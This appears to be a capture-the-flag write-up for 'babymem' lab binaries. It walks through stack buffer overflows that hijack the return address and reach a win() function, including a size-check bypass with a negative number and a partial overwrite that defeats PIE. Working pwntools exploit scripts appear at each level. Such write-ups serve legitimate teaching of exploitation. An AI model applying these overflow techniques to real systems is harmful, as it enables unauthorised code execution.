## Level 3

Our goal is to control PC register and execute `win()` function. So we need to figure out:

1. how many bytes should we overwrite (buffer size + old rbp)
2. the address of win()

Use radare2 to disassemble the ELF executable. According to the amd64 syscall table, we know that the buffer size (rsi) is 0x30 = 48. So we need to cover 48 + 8 (old rbp) + 8 (return address) = 64 bytes in total. Besides, the address of win() is 0x401d9e. 

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L3-test2-3.PNG?raw=true)

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L3-test2-2.PNG?raw=true)

So the payload is

```python
import pwn 
proc = pwn.process("/babymem_level3_testing2")
proc.sendline("64")
ret_addr = pwn.p64(0x401d9e, endian='little')
payload = b"a" * 56 + ret_addr
proc.sendline(payload)
proc.read(4096)
```

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L3-test2-1.PNG?raw=true)



## Level 4

In this level, we can input a negative number to bypass the check at 0x40218c (i.e., cmp instruction).

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L4-test1-2.PNG?raw=true)

Again, find out the address of win() function.

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L4-test1-3.PNG?raw=true)

And the size of the buffer. 

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L4-test1-4.PNG?raw=true)

Send the payload to get the flag.

 ```python
import pwn 
pwn.contex(arch='amd64')
proc = pwn.process("./babymem_level4_testing1")
win_addr = 0x00402040
payload = b"a" * (0x60 + 8) + pwn.p64(win_addr, endian='little')
proc.read(4096)
proc.sendline("-999")
proc.read(4096)
proc.sendline(payload)
proc.read(4096)
 ```

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L4-test1-1.PNG?raw=true)



## Level 6

The win() function needs a certain argument (0x1337). There is a trick to bypass it: jumps to the instruction which prepares to open /flag file. 

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L6-test1-2.PNG?raw=true)

So we overwrite the return address as 0x00401c96 instead of the start of win(). 

```python
import pwn 
pwn.contex(arch='amd64')
proc = pwn.process("./babymem_level6_testing1")
win_addr = 0x00401c96
payload = b"a" * (0x60 + 8) + pwn.p64(win_addr, endian='little')
proc.read(4096)
proc.sendline("1000")
proc.read(4096)
proc.sendline(payload)
proc.read(4096)
```

Here is the flag. 

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L6-test1-1.PNG?raw=true)



## Level 7

In this level, PIE (Position Independent Executable) is enabled, which means we don't know the exact address of our target. However, since the program is aligned on a 4 KB boundary, we can just overwrite the offset. So let's use objdump to find out the related address and buffer size: original return address at 0x16e0, target return address at 0x147d and buffer size is 0x90.  

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L7-test2-3.PNG?raw=true)

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L7-test2-2.PNG?raw=true)

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L7-test2-4.PNG?raw=true)

As I mentioned above, the program is aligned to a 4 KB (0x1000) alignment, which means the last 3 bits are fixed. So the return address should be overwritten as follows. The symbol "-" means do not change. We can use brute-force method to solve the third nibble (the symbol "?"). For example, try \x24 for several times, and we may land on the correct address. 

|      | 15   | 14   | 13   | 12   | 11   | 10   | 9    | 8    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| 0x   | -    | -    | -    | -    | -    | -    | -    | -    | -    | -    | -    | -    | ?    | 4    | 7    | d    |

So the payload is:

```python
import pwn 
pwn.context(arch='amd64')
proc = pwn.process("./babymem_level7_testing2")
payload = b"a" * (0x90 + 8) + b"\x7d\x24"        # notice the little-endian style
proc.read(); proc.sendline("154"); proc.read(); proc.sendline(payload); proc.read(); 
```

Here is the flag. 

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L7-test2-1.PNG?raw=true)